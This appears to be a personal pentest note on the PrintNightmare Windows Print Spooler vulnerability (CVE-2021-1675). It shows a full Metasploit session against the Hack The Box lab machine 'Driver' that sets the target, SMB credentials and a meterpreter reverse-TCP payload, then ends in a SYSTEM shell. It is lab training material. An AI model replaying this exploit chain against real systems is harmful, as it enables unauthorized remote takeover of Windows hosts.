# CVE-2021-1675 - printnightmare

## Enumeration

> TBD

## Exploitation

```bash
msf6 exploit(windows/local/ricoh_driver_privesc) > search printnightmare

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/dcerpc/cve_2021_1675_printnightmare  2021-06-08       normal  Yes    Print Spooler Remote DLL Injection
```

```bash
msf6 exploit(windows/local/ricoh_driver_privesc) > use exploit/windows/dcerpc/cve_2021_1675_printnightmare
[*] Using configured payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS 10.10.11.106
RHOSTS => 10.10.11.106

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBUser tony
SMBUser => tony

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPass liltony
SMBPass => liltony

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SRVHOST tun0
SRVHOST => 10.10.14.3

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set LPORT 4455
LPORT => 4455

msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > options 
Module options (exploit/windows/dcerpc/cve_2021_1675_printnightmare):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME                     no        File name to share (Default: random)
   FOLDER_NAME                   no        Folder name to share (Default: none)
   RHOSTS       10.10.11.106     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        445              yes       The SMB service port (TCP)
   SHARE                         no        Share (Default: random); cannot contain spaces or slashes
   SMBPass      liltony          no        The password for the specified username
   SMBUser      tony             no        The username to authenticate as
   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 t
                                           o listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4455             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows
```

```bash
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run

[*] Started reverse TCP handler on 10.10.14.3:4455 
[*] 10.10.11.106:445 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.11.106:445 - Target environment: Windows v10.0.10240 (x64)
[*] 10.10.11.106:445 - Enumerating the installed printer drivers...
[*] 10.10.11.106:445 - Retrieving the path of the printer driver directory...
[+] 10.10.11.106:445 - The target is vulnerable. Received ERROR_BAD_NET_NAME, implying the target is vulnerable.
[*] 10.10.11.106:445 - Server is running. Listening on 10.10.14.3:445
[*] 10.10.11.106:445 - Server started.
[*] 10.10.11.106:445 - The named pipe connection was broken, reconnecting...
[*] 10.10.11.106:445 - Successfully reconnected to the named pipe.
[*] Sending stage (201798 bytes) to 10.10.11.106
[*] 10.10.11.106:445 - The named pipe connection was broken, reconnecting...
[*] Meterpreter session 3 opened (10.10.14.3:4455 -> 10.10.11.106:49423) at 2024-06-04 10:44:52 -0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Link

- [GitHub Advisory Database](https://github.com/advisories/GHSA-vwmm-qq95-vqhf)
- [HTB Driver - good lab machine](https://app.hackthebox.com/machines/387)
